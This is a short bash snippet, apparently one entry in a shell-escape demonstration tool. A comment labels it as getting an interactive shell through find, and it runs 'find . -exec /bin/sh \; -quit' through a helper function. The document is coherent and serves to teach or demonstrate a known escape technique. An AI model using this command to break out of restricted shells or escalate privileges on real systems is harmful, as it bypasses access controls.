#!/bin/bash

: '
find - get interactive shell using exec
'

execute_command "find . -exec /bin/sh \; -quit"
create_new_line
